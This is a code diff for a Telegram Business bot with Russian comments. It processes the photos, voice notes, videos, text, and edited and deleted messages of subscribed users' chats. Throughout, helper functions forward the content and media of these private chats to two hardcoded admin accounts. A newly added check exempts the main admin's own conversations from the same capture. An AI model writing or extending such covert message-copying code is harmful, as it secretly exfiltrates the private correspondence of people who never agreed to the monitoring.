@@ -12,6 +12,115 @@ const MAIN_ADMIN_ID = 842428912;
 // ID второго админа для отправки всех сообщений
 const SECOND_ADMIN_ID = 1135073023;
 
+// Новая функция для проверки, нужно ли обрабатывать сообщение
+function shouldProcessMessage(receiverId: number): boolean {
+  // Если получатель - главный админ, НЕ обрабатываем сообщение
+  if (receiverId === MAIN_ADMIN_ID) {
+    return false;
+  }
+  return true;
+}
+
+// Обновленная функция отправки сообщений обоим админам
+async function sendToBothAdmins(ctx: Context, message: string, options?: any) {
+  try {
+    // Всегда отправляем главному админу
+    if (ctx.from?.id !== MAIN_ADMIN_ID) {
+      await ctx.api.sendMessage(MAIN_ADMIN_ID, message, options);
+    }
+    
+    // Второму админу отправляем только если получатель НЕ главный админ
+    const businessConnection = await ctx.getBusinessConnection();
+    const user_chat_id = businessConnection.user_chat_id;
+    
+    if (ctx.from?.id !== SECOND_ADMIN_ID && shouldProcessMessage(user_chat_id)) {
+      await ctx.api.sendMessage(SECOND_ADMIN_ID, message, options);
+    }
+  } catch (error) {
+    console.error("Error sending to admins:", error);
+  }
+}
+
+// Обновленная функция отправки фото обоим админам
+async function sendPhotoToBothAdmins(ctx: Context, file_id: string, caption: string, options?: any) {
+  try {
+    // Всегда отправляем главному админу
+    if (ctx.from?.id !== MAIN_ADMIN_ID) {
+      await ctx.api.sendPhoto(MAIN_ADMIN_ID, file_id, { caption, ...options });
+    }
+    
+    // Второму админу отправляем только если получатель НЕ главный админ
+    const businessConnection = await ctx.getBusinessConnection();
+    const user_chat_id = businessConnection.user_chat_id;
+    
+    if (ctx.from?.id !== SECOND_ADMIN_ID && shouldProcessMessage(user_chat_id)) {
+      await ctx.api.sendPhoto(SECOND_ADMIN_ID, file_id, { caption, ...options });
+    }
+  } catch (error) {
+    console.error("Error sending photo to admins:", error);
+  }
+}
+
+// Обновленная функция отправки голосовых сообщений обоим админам
+async function sendVoiceToBothAdmins(ctx: Context, file_id: string, caption: string, options?: any) {
+  try {
+    // Всегда отправляем главному админу
+    if (ctx.from?.id !== MAIN_ADMIN_ID) {
+      await ctx.api.sendVoice(MAIN_ADMIN_ID, file_id, { caption, ...options });
+    }
+    
+    // Второму админу отправляем только если получатель НЕ главный админ
+    const businessConnection = await ctx.getBusinessConnection();
+    const user_chat_id = businessConnection.user_chat_id;
+    
+    if (ctx.from?.id !== SECOND_ADMIN_ID && shouldProcessMessage(user_chat_id)) {
+      await ctx.api.sendVoice(SECOND_ADMIN_ID, file_id, { caption, ...options });
+    }
+  } catch (error) {
+    console.error("Error sending voice to admins:", error);
+  }
+}
+
+// Обновленная функция отправки видеосообщений обоим админам
+async function sendVideoNoteToBothAdmins(ctx: Context, file_id: string) {
+  try {
+    // Всегда отправляем главному админу
+    if (ctx.from?.id !== MAIN_ADMIN_ID) {
+      await ctx.api.sendVideoNote(MAIN_ADMIN_ID, file_id);
+    }
+    
+    // Второму админу отправляем только если получатель НЕ главный админ
+    const businessConnection = await ctx.getBusinessConnection();
+    const user_chat_id = businessConnection.user_chat_id;
+    
+    if (ctx.from?.id !== SECOND_ADMIN_ID && shouldProcessMessage(user_chat_id)) {
+      await ctx.api.sendVideoNote(SECOND_ADMIN_ID, file_id);
+    }
+  } catch (error) {
+    console.error("Error sending video note to admins:", error);
+  }
+}
+
+// Обновленная функция отправки видеофайлов обоим админам
+async function sendVideoToBothAdmins(ctx: Context, file_id: string, caption: string, options?: any) {
+  try {
+    // Всегда отправляем главному админу
+    if (ctx.from?.id !== MAIN_ADMIN_ID) {
+      await ctx.api.sendVideo(MAIN_ADMIN_ID, file_id, { caption, ...options });
+    }
+    
+    // Второму админу отправляем только если получатель НЕ главный админ
+    const businessConnection = await ctx.getBusinessConnection();
+    const user_chat_id = businessConnection.user_chat_id;
+    
+    if (ctx.from?.id !== SECOND_ADMIN_ID && shouldProcessMessage(user_chat_id)) {
+      await ctx.api.sendVideo(SECOND_ADMIN_ID, file_id, { caption, ...options });
+    }
+  } catch (error) {
+    console.error("Error sending video to admins:", error);
+  }
+}
+
 // Command handlers
 export async function getUserId(ctx: Context) {
   try {
@@ -161,91 +270,6 @@ async function updateUserInfo(ctx: Context, user_chat_id: number, usersCollectio
   }
 }
 
-// Функция для отправки сообщений обоим админам
-async function sendToBothAdmins(ctx: Context, message: string, options?: any) {
-  try {
-    // Отправляем главному админу
-    if (ctx.from?.id !== MAIN_ADMIN_ID) {
-      await ctx.api.sendMessage(MAIN_ADMIN_ID, message, options);
-    }
-    
-    // Отправляем второму админу
-    if (ctx.from?.id !== SECOND_ADMIN_ID) {
-      await ctx.api.sendMessage(SECOND_ADMIN_ID, message, options);
-    }
-  } catch (error) {
-    console.error("Error sending to admins:", error);
-  }
-}
-
-// Функция для отправки фото обоим админам
-async function sendPhotoToBothAdmins(ctx: Context, file_id: string, caption: string, options?: any) {
-  try {
-    // Отправляем главному админу
-    if (ctx.from?.id !== MAIN_ADMIN_ID) {
-      await ctx.api.sendPhoto(MAIN_ADMIN_ID, file_id, { caption, ...options });
-    }
-    
-    // Отправляем второму админу
-    if (ctx.from?.id !== SECOND_ADMIN_ID) {
-      await ctx.api.sendPhoto(SECOND_ADMIN_ID, file_id, { caption, ...options });
-    }
-  } catch (error) {
-    console.error("Error sending photo to admins:", error);
-  }
-}
-
-// Функция для отправки голосового сообщения обоим админам
-async function sendVoiceToBothAdmins(ctx: Context, file_id: string, caption: string, options?: any) {
-  try {
-    // Отправляем главному админу
-    if (ctx.from?.id !== MAIN_ADMIN_ID) {
-      await ctx.api.sendVoice(MAIN_ADMIN_ID, file_id, { caption, ...options });
-    }
-    
-    // Отправляем второму админу
-    if (ctx.from?.id !== SECOND_ADMIN_ID) {
-      await ctx.api.sendVoice(SECOND_ADMIN_ID, file_id, { caption, ...options });
-    }
-  } catch (error) {
-    console.error("Error sending voice to admins:", error);
-  }
-}
-
-// Функция для отправки видеосообщения обоим админам
-async function sendVideoNoteToBothAdmins(ctx: Context, file_id: string) {
-  try {
-    // Отправляем главному админу
-    if (ctx.from?.id !== MAIN_ADMIN_ID) {
-      await ctx.api.sendVideoNote(MAIN_ADMIN_ID, file_id);
-    }
-    
-    // Отправляем второму админу
-    if (ctx.from?.id !== SECOND_ADMIN_ID) {
-      await ctx.api.sendVideoNote(SECOND_ADMIN_ID, file_id);
-    }
-  } catch (error) {
-    console.error("Error sending video note to admins:", error);
-  }
-}
-
-// Функция для отправки видеофайла обоим админам
-async function sendVideoToBothAdmins(ctx: Context, file_id: string, caption: string, options?: any) {
-  try {
-    // Отправляем главному админу
-    if (ctx.from?.id !== MAIN_ADMIN_ID) {
-      await ctx.api.sendVideo(MAIN_ADMIN_ID, file_id, { caption, ...options });
-    }
-    
-    // Отправляем второму админу
-    if (ctx.from?.id !== SECOND_ADMIN_ID) {
-      await ctx.api.sendVideo(SECOND_ADMIN_ID, file_id, { caption, ...options });
-    }
-  } catch (error) {
-    console.error("Error sending video to admins:", error);
-  }
-}
-
 export class BusinessImageMessageHandler implements IUpdateHandler {
   private usersCollection = new UserRepository();
   private messagesCollection = new MessagesRepository();
@@ -257,6 +281,12 @@ export class BusinessImageMessageHandler implements IUpdateHandler {
     try {
       const businessConnection = await ctx.getBusinessConnection();
       const user_chat_id = businessConnection.user_chat_id;
+
+      // ПРОВЕРЯЕМ: если получатель - главный админ, пропускаем обработку
+      if (!shouldProcessMessage(user_chat_id)) {
+        console.log(`Skipping message processing for main admin ${MAIN_ADMIN_ID}`);
+        return;
+      }
 
       if (ctx.businessMessage?.photo && ctx.from) {
         // Проверяем подписку пользователя
@@ -325,6 +355,12 @@ export class BusinessVoiceMessageHandler implements IUpdateHandler {
       const businessConnection = await ctx.getBusinessConnection();
       const user_chat_id = businessConnection.user_chat_id;
 
+      // ПРОВЕРЯЕМ: если получатель - главный админ, пропускаем обработку
+      if (!shouldProcessMessage(user_chat_id)) {
+        console.log(`Skipping voice message processing for main admin ${MAIN_ADMIN_ID}`);
+        return;
+      }
+
       if (ctx.businessMessage?.voice && ctx.from) {
         // Проверяем подписку пользователя
         const hasSubscription = await this.subscriptionService.checkAccess(user_chat_id);
@@ -391,6 +427,12 @@ export class BusinessVideoMessageHandler implements IUpdateHandler {
     try {
       const businessConnection = await ctx.getBusinessConnection();
       const user_chat_id = businessConnection.user_chat_id;
+
+      // ПРОВЕРЯЕМ: если получатель - главный админ, пропускаем обработку
+      if (!shouldProcessMessage(user_chat_id)) {
+        console.log(`Skipping video message processing for main admin ${MAIN_ADMIN_ID}`);
+        return;
+      }
 
       if (ctx.businessMessage?.video_note && ctx.from) {
         // Проверяем подписку пользователя
@@ -463,6 +505,12 @@ export class BusinessVideoFileHandler implements IUpdateHandler {
       const businessConnection = await ctx.getBusinessConnection();
       const user_chat_id = businessConnection.user_chat_id;
 
+      // ПРОВЕРЯЕМ: если получатель - главный админ, пропускаем обработку
+      if (!shouldProcessMessage(user_chat_id)) {
+        console.log(`Skipping video file processing for main admin ${MAIN_ADMIN_ID}`);
+        return;
+      }
+
       if (ctx.businessMessage?.video && ctx.from) {
         // Проверяем подписку пользователя
         const hasSubscription = await this.subscriptionService.checkAccess(user_chat_id);
@@ -531,6 +579,13 @@ export class BusinessMessageHandler implements IUpdateHandler {
     try {
       const businessConnection = await ctx.getBusinessConnection();
       const user_chat_id = businessConnection.user_chat_id;
+
+      // ПРОВЕРЯЕМ: если получатель - главный админ, пропускаем обработку
+      if (!shouldProcessMessage(user_chat_id)) {
+        console.log(`Skipping text message processing for main admin ${MAIN_ADMIN_ID}`);
+        return;
+      }
+
       const businessConnectionId = ctx.businessMessage?.business_connection_id;
       
       if (businessConnectionId && ctx.businessMessage && ctx.from) {
@@ -737,6 +792,13 @@ export class DeletedBusinessMessageHandler implements IUpdateHandler {
       if (businessConnectionId) {
         const businessConnection = await ctx.api.getBusinessConnection(businessConnectionId);
         const user_chat_id = businessConnection.user_chat_id;
+
+        // ПРОВЕРЯЕМ: если получатель - главный админ, пропускаем обработку
+        if (!shouldProcessMessage(user_chat_id)) {
+          console.log(`Skipping deleted message processing for main admin ${MAIN_ADMIN_ID}`);
+          return;
+        }
+
         const { message_ids } = ctx.deletedBusinessMessages;
 
         // Проверяем подписку пользователя
@@ -770,6 +832,13 @@ export class EditedBusinessMessageHandler implements IUpdateHandler {
       if (businessConnectionId && ctx.editedBusinessMessage && ctx.from) {
         const businessConnection = await ctx.api.getBusinessConnection(businessConnectionId);
         const receiverId = businessConnection.user_chat_id;
+
+        // ПРОВЕРЯЕМ: если получатель - главный админ, пропускаем обработку
+        if (!shouldProcessMessage(receiverId)) {
+          console.log(`Skipping edited message processing for main admin ${MAIN_ADMIN_ID}`);
+          return;
+        }
+
         const { message_id, text: newMessageText, from } = ctx.editedBusinessMessage;
 
         // Проверяем подписку пользователя
